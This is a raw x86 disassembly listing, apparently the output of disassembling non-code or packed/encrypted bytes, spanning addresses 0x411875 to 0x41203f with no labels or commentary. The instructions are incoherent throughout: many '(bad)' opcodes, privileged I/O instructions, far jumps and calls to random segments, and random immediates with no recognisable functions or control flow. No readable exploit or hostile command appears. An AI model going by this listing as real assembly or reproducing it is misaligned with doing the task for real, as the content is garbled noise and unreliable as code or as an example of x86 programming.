  411875:	rol    BYTE PTR [edi+eax*2-0x75],cl
  411879:	mov    ds:0x503476b3,al
  41187e:	icebp  
  41187f:	sbb    eax,0xf9c9bea2
  411884:	xchg   ebx,eax
  411885:	jmp    0xe653:0x663e9d4f
  41188c:	out    dx,eax
  41188d:	fnstenv [esi]
  41188f:	scas   al,BYTE PTR es:[edi]
  411890:	call   0xb46c:0xe16ed11e
  411897:	int3   
  411898:	or     edx,edi
  41189a:	je     0x411866
  41189c:	push   eax
  41189d:	push   cs
  41189e:	mov    WORD PTR [edx+0x26],gs
  4118a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118a2:	xchg   ebx,eax
  4118a3:	popa   
  4118a4:	jecxz  0x411826
  4118a6:	sbb    DWORD PTR [esi+ebx*4+0x24cf11fa],ebp
  4118ad:	not    BYTE PTR [ebx+0x0]
  4118b0:	arpl   WORD PTR [ecx],bp
  4118b2:	mov    dl,0x9a
  4118b4:	imul   DWORD PTR [ecx]
  4118b6:	dec    ecx
  4118b7:	jbe    0x4118df
  4118b9:	cli    
  4118ba:	std    
  4118bb:	outs   dx,BYTE PTR ds:[esi]
  4118bc:	mov    al,ch
  4118be:	(bad)  
  4118c1:	push   ecx
  4118c2:	test   al,0x2e
  4118c4:	shl    BYTE PTR ds:[ecx+0x30180251],cl
  4118cb:	lds    edi,FWORD PTR [esi+ecx*2]
  4118ce:	adc    DWORD PTR [edx+0x21],0x5cadbd28
  4118d5:	sbb    eax,0xe82d74cd
  4118da:	adc    cl,BYTE PTR [eax]
  4118dc:	call   0xe28f5012
  4118e1:	dec    ecx
  4118e2:	fsubr  QWORD PTR [edi]
  4118e4:	ja     0x4118b1
  4118e6:	call   0x8289e736
  4118eb:	iret   
  4118ec:	mov    al,0x52
  4118ee:	sbb    dh,BYTE PTR [eax]
  4118f0:	int    0x94
  4118f2:	mov    edi,gs
  4118f4:	pop    esi
  4118f5:	leave  
  4118f6:	pop    es
  4118f7:	push   ebx
  4118f8:	jmp    FWORD PTR [esi-0x57]
  4118fb:	jno    0x411880
  4118fd:	add    ecx,eax
  4118ff:	pop    ecx
  411900:	int3   
  411901:	repnz cmp cl,BYTE PTR fs:[ebx+eiz*8]
  411906:	std    
  411907:	xchg   ecx,ecx
  411909:	cmc    
  41190a:	xor    DWORD PTR [ebp+edx*2-0xc],0xffffff94
  41190f:	dec    ebp
  411910:	in     eax,dx
  411911:	shl    DWORD PTR [esi+0x2c144956],1
  411917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411918:	sbb    al,0xc9
  41191a:	inc    ebp
  41191b:	call   0xbf062c9f
  411920:	bound  eax,QWORD PTR [eax+0x6b004848]
  411926:	mov    esp,DWORD PTR [ecx+ecx*1]
  411929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41192a:	jmp    0x411955
  41192c:	pop    edx
  41192d:	ds dec edx
  41192f:	fadd   DWORD PTR [esi-0x1a]
  411932:	outs   dx,DWORD PTR ds:[esi]
  411933:	pop    esp
  411934:	repz xor eax,0x5a45910d
  41193a:	mov    esp,0x282d389b
  41193f:	xor    ebx,eax
  411941:	push   ds
  411942:	mov    esp,0x2c09e65b
  411947:	pop    es
  411948:	sub    edi,DWORD PTR [esp+edx*4]
  41194b:	cmp    ah,ah
  41194d:	sub    ecx,DWORD PTR [eax+0x16]
  411950:	mov    dh,BYTE PTR [bx+si]
  411953:	cmc    
  411954:	add    ecx,edx
  411956:	lds    esp,FWORD PTR [ebp-0x6c]
  411959:	jb     0x4118f0
  41195b:	adc    al,0x8e
  41195d:	mov    edi,0x68d2eb2d
  411962:	aaa    
  411963:	fmul   DWORD PTR [ebx+0x5a]
  411966:	cmp    esp,ecx
  411968:	imul   edi,DWORD PTR [esp+ebx*1+0x10cb0dad],0x37d34f43
  411973:	mov    cl,0xf8
  411975:	fidivr DWORD PTR ds:[ecx]
  411978:	dec    esi
  411979:	out    dx,eax
  41197a:	fild   QWORD PTR [edx+0x3b43b563]
  411980:	push   esp
  411981:	fidiv  DWORD PTR [esi+0x9]
  411984:	xor    BYTE PTR ds:0xaacad343,bh
  41198a:	mov    ds:0x15888d9c,eax
  41198f:	mov    ds:0x893be5,al
  411994:	jmp    0x6c4b7c04
  411999:	or     ebp,DWORD PTR [ebx-0x43b3560a]
  41199f:	dec    edi
  4119a0:	out    0x67,eax
  4119a2:	test   DWORD PTR [ebp+0x4fb17d9],edx
  4119a8:	sahf   
  4119a9:	in     al,dx
  4119aa:	popf   
  4119ab:	arpl   bx,dx
  4119ad:	mov    DWORD PTR [ebx],ebp
  4119af:	fistp  QWORD PTR [ecx]
  4119b1:	xchg   DWORD PTR [edi],edi
  4119b3:	test   eax,0x981a2344
  4119b8:	das    
  4119b9:	in     eax,0xb8
  4119bb:	test   eax,0x104c7fc7
  4119c0:	sub    eax,0x5cf6ca2d
  4119c5:	add    BYTE PTR [eax+0x7ef9b466],bh
  4119cb:	stos   BYTE PTR es:[edi],al
  4119cc:	lds    ebp,FWORD PTR [ebx-0x18]
  4119cf:	in     eax,dx
  4119d0:	or     al,BYTE PTR [ebx+0x37203885]
  4119d6:	loope  0x411967
  4119d8:	xchg   DWORD PTR ds:0xc7e7954,ebp
  4119de:	das    
  4119df:	cmp    eax,0xc2858f2
  4119e4:	jl     0x4119c9
  4119e6:	jbe    0x411a1a
  4119e8:	pusha  
  4119e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119ea:	ja     0x4119a9
  4119ec:	rcr    BYTE PTR [ecx+edi*8],cl
  4119ef:	sbb    al,0x7c
  4119f1:	call   0x94ab:0xa5bd8c8
  4119f8:	loop   0x411a34
  4119fa:	pop    eax
  4119fb:	add    ah,ch
  4119fd:	ficom  WORD PTR [esi+ecx*8-0x18]
  411a01:	jl     0x411991
  411a03:	pop    ss
  411a04:	xor    al,0xad
  411a06:	add    dl,BYTE PTR [edx+0x18cde02b]
  411a0c:	sbb    eax,0x345269ef
  411a11:	jg     0x4119de
  411a13:	mov    al,0xf6
  411a15:	(bad)  
  411a16:	clc    
  411a17:	adc    DWORD PTR [edi],0x1c
  411a1a:	jecxz  0x411a1e
  411a1c:	jne    0x411a32
  411a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a1f:	les    ecx,FWORD PTR [ebx-0xe]
  411a22:	and    bl,BYTE PTR [ebp+ebp*1-0x2ed112e4]
  411a29:	inc    edx
  411a2a:	xchg   esp,eax
  411a2b:	fdiv   QWORD PTR [ecx-0x78]
  411a2e:	shl    DWORD PTR ds:0xac6cfeb4,cl
  411a34:	repz pop esi
  411a36:	(bad)  
  411a37:	call   0x738f:0x774a96c1
  411a3e:	mov    ds:0xb2c13e5d,al
  411a43:	push   edi
  411a44:	inc    edx
  411a45:	push   ebx
  411a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a47:	dec    edi
  411a48:	mov    al,0x8f
  411a4a:	(bad)  
  411a4b:	aaa    
  411a4c:	les    eax,FWORD PTR [ebp-0x53c5544]
  411a52:	push   eax
  411a53:	das    
  411a54:	loope  0x411a0f
  411a56:	mov    cl,BYTE PTR [eax+0xe]
  411a59:	cmp    edi,DWORD PTR [esi+0x5b]
  411a5c:	pop    edx
  411a5d:	dec    esi
  411a5e:	popf   
  411a5f:	xchg   esi,eax
  411a60:	mov    ecx,0x88b3b691
  411a65:	add    edi,DWORD PTR [eax]
  411a67:	pop    es
  411a68:	in     eax,0xae
  411a6a:	nop
  411a6b:	div    BYTE PTR [eax+eax*1+0xe75f827]
  411a72:	xchg   edi,eax
  411a73:	mov    al,ds:0x7424df3c
  411a78:	enter  0x2c51,0x6f
  411a7c:	fisubr WORD PTR [eax]
  411a7e:	jne    0x411a7f
  411a80:	stos   BYTE PTR es:[edi],al
  411a81:	push   ebp
  411a82:	dec    esi
  411a83:	loope  0x411a27
  411a85:	ret    
  411a86:	mov    ecx,DWORD PTR [edi+0x6a]
  411a89:	cs test ecx,0x2f6fc012
  411a90:	test   DWORD PTR [ecx-0x64],0x20df3d2e
  411a97:	push   edx
  411a98:	retf   
  411a99:	or     BYTE PTR ds:0xa531deaf,ah
  411a9f:	std    
  411aa0:	mov    al,0xcc
  411aa2:	in     al,0x49
  411aa4:	xchg   esi,eax
  411aa5:	(bad)  
  411aa6:	sub    DWORD PTR [esi+ecx*1-0x47],eax
  411aaa:	es call 0x3790:0xf674b722
  411ab2:	push   eax
  411ab3:	gs cld 
  411ab5:	pop    edx
  411ab6:	lds    edx,FWORD PTR [ebx+0x7ef4b811]
  411abc:	sahf   
  411abd:	cld    
  411abe:	aam    0x92
  411ac0:	sbb    eax,0xabf6016f
  411ac5:	add    DWORD PTR [esi],esp
  411ac7:	ins    DWORD PTR es:[edi],dx
  411ac8:	out    0xe8,eax
  411aca:	(bad)  
  411acb:	sub    cl,BYTE PTR [edi-0x545e96be]
  411ad1:	sbb    esi,eax
  411ad3:	aad    0x52
  411ad5:	cmp    DWORD PTR [edx-0xf],ebx
  411ad8:	or     ebp,DWORD PTR [ebx-0x5bbaddaa]
  411ade:	push   esi
  411adf:	or     DWORD PTR es:[ebx+eiz*8-0x2c],esp
  411ae4:	scas   eax,DWORD PTR es:[edi]
  411ae5:	add    DWORD PTR [ebx],eax
  411ae7:	out    0xa5,eax
  411ae9:	adc    bl,dl
  411aeb:	popa   
  411aec:	adc    eax,0xfc27d240
  411af1:	rol    bh,cl
  411af3:	fs fs sub al,0xda
  411af7:	push   esp
  411af8:	jnp    0x411aa9
  411afa:	dec    ecx
  411afb:	scas   eax,DWORD PTR es:[edi]
  411afc:	mov    dh,0x7b
  411afe:	and    esi,0x4c
  411b01:	xor    BYTE PTR ds:0x6e69eecd,dh
  411b07:	mov    bh,0x41
  411b09:	xchg   ebp,eax
  411b0a:	add    eax,0xd1902839
  411b0f:	in     al,0x1d
  411b11:	rcr    DWORD PTR es:[ebx+eiz*1],cl
  411b15:	call   0x1b6e:0x6c5fa73
  411b1c:	mov    al,ds:0xc8579979
  411b21:	xor    eax,0x3487aca3
  411b26:	clc    
  411b27:	ret    0x53ec
  411b2a:	inc    ebx
  411b2b:	pop    edx
  411b2c:	lock ins BYTE PTR es:[edi],dx
  411b2e:	mov    al,BYTE PTR ds:0x217b8d72
  411b34:	in     eax,0x4
  411b36:	leave  
  411b37:	int    0xcb
  411b39:	add    DWORD PTR [esi-0x7],edi
  411b3c:	push   cs
  411b3d:	fdivr  DWORD PTR [edx-0x17]
  411b40:	lods   eax,DWORD PTR ds:[esi]
  411b41:	xchg   ecx,eax
  411b42:	call   0x827a0fa4
  411b47:	adc    eax,0xd25e9b61
  411b4c:	mov    eax,0x76a54420
  411b51:	jne    0x411b7b
  411b53:	sti    
  411b54:	inc    ebp
  411b55:	mov    edx,DWORD PTR [edi-0x63]
  411b58:	jle    0x411b9b
  411b5a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b5c:	or     BYTE PTR [edi-0x3644cb8a],ch
  411b62:	push   0x68
  411b64:	pop    edi
  411b65:	mov    ch,0x37
  411b67:	adc    ebp,DWORD PTR ss:[eax+0x1]
  411b6b:	jns    0x411b9b
  411b6d:	mov    ah,0x26
  411b6f:	jl     0x411b04
  411b71:	adc    edi,eax
  411b73:	loopne 0x411bbb
  411b75:	test   bh,bh
  411b77:	pop    ebp
  411b78:	lods   al,BYTE PTR ds:[esi]
  411b79:	cmp    eax,0xb37b2973
  411b7e:	(bad)  
  411b80:	mov    ah,BYTE PTR [esi]
  411b82:	test   eax,0x4d7525ca
  411b87:	push   esi
  411b88:	aas    
  411b89:	mov    cl,0x39
  411b8b:	push   edi
  411b8c:	sbb    BYTE PTR [edi-0x67],dl
  411b8f:	xchg   ebp,eax
  411b90:	sbb    al,0xa8
  411b92:	sbb    BYTE PTR [ecx-0x22a3e088],ah
  411b98:	addr16 fdivp st(7),st
  411b9b:	adc    dh,BYTE PTR [bp+si-0x5a]
  411b9f:	fimul  DWORD PTR [esi]
  411ba1:	out    0x4c,al
  411ba3:	stos   DWORD PTR es:[edi],eax
  411ba4:	sar    DWORD PTR [edx+edi*8+0xb],1
  411ba8:	xor    eax,0xfd10089a
  411bad:	out    0xd4,eax
  411baf:	xor    DWORD PTR [ebx],eax
  411bb1:	xor    DWORD PTR [ecx-0xf],eax
  411bb4:	cmp    al,0x29
  411bb6:	mov    cl,0xa1
  411bb8:	mov    dh,0x7f
  411bba:	mov    ds:0xd34f4ac6,eax
  411bbf:	jnp    0x411c2b
  411bc1:	(bad)  
  411bc2:	daa    
  411bc3:	loope  0x411b79
  411bc5:	and    bl,dl
  411bc7:	cld    
  411bc8:	test   eax,0x8da3d62b
  411bcd:	fbstp  TBYTE PTR [ebx]
  411bcf:	aad    0x2b
  411bd1:	jbe    0x411be4
  411bd3:	imul   ebx,esi,0x5d191fa0
  411bd9:	inc    ecx
  411bda:	sbb    BYTE PTR [esp+edx*1+0x67],ch
  411bde:	cwde   
  411bdf:	mov    BYTE PTR [esi+0x9340625],bl
  411be5:	and    al,0x89
  411be7:	add    BYTE PTR [edi-0x4493b338],0x5a
  411bee:	mov    ch,0xdd
  411bf0:	aam    0x6d
  411bf2:	sub    bh,BYTE PTR [ebp+0x29b7d241]
  411bf8:	dec    edi
  411bf9:	pop    ss
  411bfa:	xchg   BYTE PTR [edi+eax*2+0x2d],bl
  411bfe:	mov    al,ds:0x52446cc5
  411c03:	lock gs mov bl,0x2c
  411c07:	mov    edx,0x64c514a2
  411c0c:	mov    WORD PTR [ebx+0x4a853626],ds
  411c12:	xchg   BYTE PTR ds:0x23dfdf25,bh
  411c18:	dec    edx
  411c19:	hlt    
  411c1a:	dec    edi
  411c1b:	push   ss
  411c1c:	xchg   esi,eax
  411c1d:	out    0xc4,eax
  411c1f:	push   ebx
  411c20:	icebp  
  411c21:	leave  
  411c22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c23:	jno    0x411c40
  411c25:	retf   
  411c26:	dec    esi
  411c27:	cmp    BYTE PTR [esi+0x3ac1e4ba],ch
  411c2d:	sti    
  411c2e:	pop    ecx
  411c2f:	pop    ss
  411c30:	mov    al,0xea
  411c32:	mov    cl,0xf1
  411c34:	sub    edx,DWORD PTR es:[ebx+0x728b3bd4]
  411c3b:	out    dx,al
  411c3c:	lods   al,BYTE PTR ds:[esi]
  411c3d:	shl    BYTE PTR [eax+0x7a5167bc],1
  411c43:	adc    cl,cl
  411c45:	mov    al,0xa8
  411c47:	lods   eax,DWORD PTR ds:[esi]
  411c48:	pop    ds
  411c49:	jmp    0x411c4a
  411c4b:	sahf   
  411c4c:	fnstenv [edx]
  411c4e:	cwde   
  411c4f:	rcl    BYTE PTR [edx+0x1385f570],0xaa
  411c56:	arpl   WORD PTR [ebp-0xb],sp
  411c59:	and    BYTE PTR [edi+0x4f],dl
  411c5c:	repnz (bad) 
  411c5e:	xor    al,al
  411c60:	cmp    eax,0x495f38ba
  411c65:	jg     0x411c97
  411c67:	mov    dl,BYTE PTR [esp+edi*2-0x3c0401f4]
  411c6e:	xchg   DWORD PTR [edx-0x7d07ad29],ebx
  411c74:	imul   esi,DWORD PTR [ebx+edi*4-0x7c],0xdce0ee39
  411c7c:	fdiv   QWORD PTR [ecx+0x65]
  411c7f:	jge    0x411ce4
  411c81:	cmp    ecx,DWORD PTR [edi]
  411c83:	push   ecx
  411c84:	lea    ebx,[ebx+0x4a565201]
  411c8a:	repz push ss
  411c8c:	mov    al,ds:0x6facadc4
  411c91:	xor    ebx,eax
  411c93:	fld    QWORD PTR [ebx]
  411c95:	dec    eax
  411c96:	jle    0x411cf9
  411c98:	imul   edx,DWORD PTR [esi+0x2865a437],0x97fdd0bf
  411ca2:	sub    ebp,ebx
  411ca4:	fwait
  411ca5:	add    ebp,DWORD PTR [ecx-0x3b5725c9]
  411cab:	or     DWORD PTR [ebx],edx
  411cad:	inc    ecx
  411cae:	and    bl,BYTE PTR [edi-0x28f3b36d]
  411cb4:	xchg   ebx,eax
  411cb5:	je     0x411c56
  411cb7:	sub    DWORD PTR [eax+0x6419cde5],edi
  411cbd:	pop    edx
  411cbe:	dec    esi
  411cbf:	jle    0x411d2c
  411cc1:	mov    es,ecx
  411cc3:	or     DWORD PTR [edi],ebp
  411cc5:	jne    0x411d3a
  411cc7:	push   esp
  411cc8:	in     eax,dx
  411cc9:	xchg   BYTE PTR [eax+ebp*4-0x5275bf41],ah
  411cd0:	push   0xffffffb3
  411cd2:	outs   dx,BYTE PTR ds:[esi]
  411cd3:	or     eax,0x7d7e066a
  411cd8:	dec    esp
  411cd9:	inc    esi
  411cda:	(bad)  [ebx-0x9]
  411cdd:	repnz pop esp
  411cdf:	xchg   DWORD PTR [ecx+0x70],ebx
  411ce2:	jne    0x411d22
  411ce4:	or     eax,0x70704d3f
  411ce9:	mov    bl,ch
  411ceb:	xchg   ecx,eax
  411cec:	xchg   DWORD PTR [ebp+0x6c],ebx
  411cef:	or     bl,BYTE PTR [ebp+edi*8-0x75]
  411cf3:	and    dh,BYTE PTR [ebp+ebp*2+0x15]
  411cf7:	shl    BYTE PTR [esi-0x6a283b08],1
  411cfd:	mov    ebx,0x976ed39e
  411d02:	xchg   ecx,eax
  411d03:	mov    esp,0xa00953a9
  411d08:	jns    0x411d50
  411d0a:	adc    dh,0x5c
  411d0d:	icebp  
  411d0e:	push   edx
  411d0f:	test   BYTE PTR [edi+edi*4-0x52],ch
  411d13:	mov    bl,bh
  411d15:	xor    DWORD PTR [ebx-0x5d46aa71],ebx
  411d1b:	fs mov al,0xdb
  411d1e:	mov    ch,0xb1
  411d20:	das    
  411d21:	loop   0x411d09
  411d23:	jb     0x411ce4
  411d25:	(bad)  
  411d26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d27:	aam    0x0
  411d29:	add    al,0xe3
  411d2b:	addr16 fsubrp st(3),st
  411d2e:	jmp    0xd3ba:0x29511c67
  411d35:	mov    edx,DWORD PTR [eax+0x5816d5cf]
  411d3b:	push   0x2c
  411d3d:	sub    cl,BYTE PTR [ebp-0x69]
  411d40:	lock jbe 0x411d72
  411d43:	fld    TBYTE PTR [esi]
  411d45:	adc    esp,DWORD PTR [edx]
  411d47:	lods   eax,DWORD PTR ds:[esi]
  411d48:	iret   
  411d49:	mov    ah,0xd1
  411d4b:	lock or al,0x97
  411d4e:	jge    0x411d93
  411d50:	adc    ecx,DWORD PTR [esi+0x5cea8258]
  411d56:	cwde   
  411d57:	mov    ebp,0x2bfae4fc
  411d5c:	sahf   
  411d5d:	jmp    0x411d91
  411d5f:	add    ebx,0x936a726a
  411d65:	xor    al,0x9b
  411d67:	mov    ds:0x1c0e08b6,eax
  411d6c:	pop    esp
  411d6d:	xor    BYTE PTR ds:0x8f50860,0x2b
  411d74:	ins    BYTE PTR es:[edi],dx
  411d75:	scas   al,BYTE PTR es:[edi]
  411d76:	bound  ebp,QWORD PTR [ecx-0x17845334]
  411d7c:	fld    DWORD PTR [eax]
  411d7e:	pop    es
  411d7f:	push   ebp
  411d80:	jg     0x411d7b
  411d82:	sub    BYTE PTR [ebp-0x4481072c],0xbe
  411d89:	std    
  411d8a:	dec    ebx
  411d8b:	je     0x411d8f
  411d8d:	icebp  
  411d8e:	add    DWORD PTR [ebx-0x50c44e78],esp
  411d94:	pop    ebx
  411d95:	ret    
  411d96:	cmp    BYTE PTR [edi-0x45],cl
  411d99:	loop   0x411d94
  411d9b:	pop    edi
  411d9c:	mov    bh,0x68
  411d9e:	(bad)  
  411d9f:	pop    edx
  411da0:	pop    ebp
  411da1:	push   0x44562ec
  411da6:	js     0x411d68
  411da8:	nop
  411da9:	jno    0x411dd9
  411dab:	(bad)  
  411dac:	aad    0x6a
  411dae:	xor    DWORD PTR [ecx-0x69],esi
  411db1:	shl    DWORD PTR [ebx],0x35
  411db4:	aam    0xa8
  411db6:	push   ebp
  411db7:	repnz rcr BYTE PTR [eax+0x5aedea9b],0x44
  411dbf:	push   eax
  411dc0:	adc    bl,BYTE PTR ds:0x86b2cd10
  411dc6:	jge    0x411e2a
  411dc8:	repz jmp 0xbed4:0xbd41c26
  411dd0:	retf   
  411dd1:	cdq    
  411dd2:	mov    esi,0xe921f6f1
  411dd7:	add    al,0x5e
  411dd9:	ret    0xc5d3
  411ddc:	jge    0x411e13
  411dde:	out    dx,al
  411ddf:	xor    bh,al
  411de1:	push   edi
  411de2:	add    DWORD PTR [ecx+0x14],ebx
  411de5:	xchg   edi,eax
  411de6:	scas   eax,DWORD PTR es:[edi]
  411de7:	sbb    ah,BYTE PTR [ebx-0x50]
  411dea:	iret   
  411deb:	in     al,0xa6
  411ded:	push   esp
  411dee:	pop    ds
  411def:	sub    eax,DWORD PTR [ecx-0x71]
  411df2:	pop    edi
  411df3:	(bad)  
  411df4:	pop    ebx
  411df5:	ins    DWORD PTR es:[edi],dx
  411df6:	or     eax,0x516b8d64
  411dfb:	xchg   BYTE PTR [edi+edx*8-0x47],al
  411dff:	aaa    
  411e00:	pop    ecx
  411e01:	scas   eax,DWORD PTR es:[edi]
  411e02:	dec    ebp
  411e03:	jbe    0x411e32
  411e05:	call   0xb2b4:0x7d6ccc31
  411e0c:	clc    
  411e0d:	stos   BYTE PTR es:[edi],al
  411e0e:	mov    edi,0x7efe349f
  411e13:	js     0x411dc4
  411e15:	div    DWORD PTR [edi]
  411e17:	scas   al,BYTE PTR es:[edi]
  411e18:	push   ss
  411e19:	push   esp
  411e1a:	adc    DWORD PTR [edi+0x4656ceed],esi
  411e20:	mov    bl,0x62
  411e22:	mov    ch,0xc3
  411e24:	adc    bh,BYTE PTR [esi+0x77]
  411e27:	(bad)  
  411e28:	icebp  
  411e29:	xchg   bh,ch
  411e2b:	mov    edx,0xe366a60
  411e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e31:	sbb    BYTE PTR [ecx-0x77],dh
  411e34:	popf   
  411e35:	adc    al,0xdc
  411e37:	std    
  411e38:	add    bl,BYTE PTR [esi-0x4]
  411e3b:	je     0x411eaa
  411e3d:	in     eax,0x55
  411e3f:	inc    ecx
  411e40:	sbb    edi,DWORD PTR [esi]
  411e42:	sbb    bl,BYTE PTR [edi-0x3a]
  411e45:	les    edi,FWORD PTR [eax-0x75df3587]
  411e4b:	(bad)  
  411e4c:	leave  
  411e4d:	adc    ebp,0xffffffc3
  411e50:	aad    0x31
  411e52:	or     BYTE PTR [ecx-0x2a8d3483],0xf4
  411e59:	xor    dl,dh
  411e5b:	cmp    al,0x0
  411e5d:	mov    edx,0x9092f514
  411e62:	imul   edx,DWORD PTR [esi+0x4f],0x1e
  411e66:	call   0x457ec40b
  411e6b:	xchg   ebx,eax
  411e6c:	sahf   
  411e6d:	lahf   
  411e6e:	xchg   ebx,eax
  411e6f:	adc    BYTE PTR [edi+0x60],0x90
  411e73:	jbe    0x411e68
  411e75:	leave  
  411e76:	outs   dx,BYTE PTR ds:[esi]
  411e77:	mov    edx,0x407a49aa
  411e7c:	xchg   ebp,esi
  411e7e:	xor    al,0xaf
  411e80:	repnz sbb eax,0x67
  411e84:	arpl   WORD PTR [ebx-0x51],si
  411e87:	out    0x9f,al
  411e89:	jmp    0xa067:0xd1484f01
  411e90:	aaa    
  411e91:	inc    ebp
  411e92:	adc    al,0x0
  411e94:	jne    0x411e3d
  411e96:	ins    DWORD PTR es:[edi],dx
  411e97:	sub    ebx,ebp
  411e99:	jbe    0x411e30
  411e9b:	rcr    al,0xd8
  411e9e:	pop    ecx
  411e9f:	sub    eax,0xd73bf85e
  411ea4:	push   esp
  411ea5:	push   ecx
  411ea6:	ja     0x411e48
  411ea8:	stc    
  411ea9:	xchg   BYTE PTR [edi+0x33ae043],dl
  411eaf:	jbe    0x411f2e
  411eb1:	mov    bh,0x55
  411eb3:	push   edi
  411eb4:	xor    eax,0xeaa476be
  411eb9:	addps  xmm1,XMMWORD PTR [edi+esi*8-0x45323283]
  411ec1:	call   0x13d90d85
  411ec6:	call   0xf5ec:0x8507e279
  411ecd:	daa    
  411ece:	xor    DWORD PTR [ebp+0x33],edx
  411ed1:	rcl    BYTE PTR [edi-0x77],cl
  411ed4:	aaa    
  411ed5:	shl    BYTE PTR [ecx-0x52256332],cl
  411edb:	lods   eax,DWORD PTR ds:[esi]
  411edc:	ss add al,0x6e
  411edf:	call   0xf10ebe6e
  411ee4:	ins    BYTE PTR es:[edi],dx
  411ee5:	jecxz  0x411f0a
  411ee7:	stos   BYTE PTR es:[edi],al
  411ee8:	out    dx,al
  411ee9:	jns    0x411f45
  411eeb:	icebp  
  411eec:	mov    esi,0xc90546f3
  411ef1:	(bad)  
  411ef2:	push   ss
  411ef3:	sbb    al,0xab
  411ef5:	dec    eax
  411ef6:	loope  0x411f05
  411ef8:	in     eax,0x24
  411efa:	mov    al,ds:0xd71b8ee6
  411eff:	scas   al,BYTE PTR es:[edi]
  411f00:	scas   eax,DWORD PTR es:[edi]
  411f01:	nop
  411f02:	mulps  xmm1,XMMWORD PTR [edx]
  411f05:	stos   DWORD PTR es:[edi],eax
  411f06:	jmp    0x8781:0x31763cd6
  411f0d:	jmp    0x756e8a75
  411f12:	or     ecx,edx
  411f14:	mov    edi,ebx
  411f16:	jno    0x411f7d
  411f18:	leave  
  411f19:	push   edx
  411f1a:	sub    ch,BYTE PTR [eax+0xe]
  411f1d:	ins    DWORD PTR es:[edi],dx
  411f1e:	jno    0x411ecf
  411f20:	enter  0x3682,0x16
  411f24:	aad    0xd0
  411f26:	mov    ecx,0x590ac1ad
  411f2b:	sub    BYTE PTR [eax+0x625e1b11],dh
  411f31:	stos   DWORD PTR es:[edi],eax
  411f32:	adc    esp,DWORD PTR [edx-0x56]
  411f35:	jle    0x411faf
  411f37:	and    ch,BYTE PTR [edi]
  411f39:	popf   
  411f3a:	pop    edx
  411f3b:	imul   edi,DWORD PTR [ecx+0x3e02bfa2],0xffffffb7
  411f42:	jp     0x411fa6
  411f44:	sub    eax,0x1661ea86
  411f49:	and    al,0x88
  411f4b:	std    
  411f4c:	jne    0x411f7d
  411f4e:	xchg   esi,eax
  411f4f:	scas   eax,DWORD PTR es:[edi]
  411f50:	adc    al,0xf6
  411f52:	jno    0x411f56
  411f54:	loop   0x411f1f
  411f56:	sbb    al,0x56
  411f58:	pop    esp
  411f59:	aam    0x17
  411f5b:	lahf   
  411f5c:	push   esi
  411f5d:	or     eax,0xe61bba98
  411f62:	and    eax,0xba5472a
  411f67:	aaa    
  411f68:	cdq    
  411f69:	xor    DWORD PTR [ecx],edi
  411f6b:	adc    DWORD PTR [ecx+eax*8-0x35048a3],eax
  411f72:	lods   al,BYTE PTR ds:[esi]
  411f73:	(bad)  
  411f74:	and    al,cl
  411f76:	and    bl,bh
  411f78:	xchg   esi,eax
  411f79:	adc    dh,BYTE PTR [edi+0x202a6053]
  411f7f:	mov    esp,0xdc8ee965
  411f84:	loope  0x411f8f
  411f86:	pop    ebx
  411f87:	stos   BYTE PTR es:[edi],al
  411f88:	inc    esp
  411f89:	cmp    al,0x5c
  411f8b:	cld    
  411f8c:	adc    eax,0xfd4924ee
  411f91:	adc    al,0xf2
  411f93:	inc    ebp
  411f94:	ror    esp,0x99
  411f97:	xor    DWORD PTR [ebp+ecx*1-0x73],esp
  411f9b:	sbb    DWORD PTR [eax+0x11a65545],esi
  411fa1:	je     0x411f2f
  411fa3:	sub    al,0xb8
  411fa5:	jmp    0x41201f
  411fa7:	mov    ds:0x4f746b2b,eax
  411fac:	sub    al,0xd
  411fae:	call   0x825211dc
  411fb3:	repnz add BYTE PTR [edi],ch
  411fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fb7:	and    BYTE PTR [ecx+0x12257e2c],cl
  411fbd:	out    0x34,al
  411fbf:	xchg   ebx,eax
  411fc0:	pop    ds
  411fc1:	mov    dl,0x90
  411fc3:	inc    edx
  411fc4:	out    dx,eax
  411fc5:	mov    ?,WORD PTR [ebx+0x7b]
  411fc8:	push   esp
  411fc9:	pop    ebp
  411fca:	pop    esi
  411fcb:	int    0xd5
  411fcd:	cs jmp 0x411f79
  411fd0:	inc    ecx
  411fd1:	cmp    eax,0x32ce7987
  411fd6:	retf   0xf2b9
  411fd9:	fmul   QWORD PTR [esi+ebx*4+0x4]
  411fdd:	lock test al,0x3b
  411fe0:	mov    ds:0xdc0fbda1,eax
  411fe5:	int    0x75
  411fe7:	or     DWORD PTR [edx],0x23af193f
  411fed:	mov    ecx,0x281abb56
  411ff2:	dec    ecx
  411ff3:	jns    0x41202e
  411ff5:	outs   dx,BYTE PTR ds:[esi]
  411ff6:	addr16 push 0xc2f06166
  411ffc:	cmp    dl,BYTE PTR [ecx-0x45217726]
  412002:	xor    al,0x14
  412004:	mov    esp,0x9d85c27
  412009:	pop    edi
  41200a:	mov    bh,0x26
  41200c:	test   DWORD PTR [ebp-0x1bd43bd6],ebp
  412012:	adc    BYTE PTR ss:[ecx+edi*8],ah
  412016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412017:	inc    edx
  412018:	push   ecx
  412019:	lods   al,BYTE PTR ds:[esi]
  41201a:	daa    
  41201b:	ins    BYTE PTR es:[edi],dx
  41201c:	stos   BYTE PTR es:[edi],al
  41201d:	xor    eax,0x3e6b82f7
  412022:	fmul   DWORD PTR [ebx-0x10]
  412025:	fcom   QWORD PTR [edi-0x30]
  412028:	mov    dh,0x24
  41202a:	icebp  
  41202b:	xchg   ecx,eax
  41202c:	cmp    eax,0xbd46dfc0
  412031:	dec    edi
  412032:	add    ebx,ebp
  412034:	mov    ecx,0x4a4e9bce
  412039:	sbb    ch,0x0
  41203c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41203d:	js     0x41200e
  41203f:	popa   
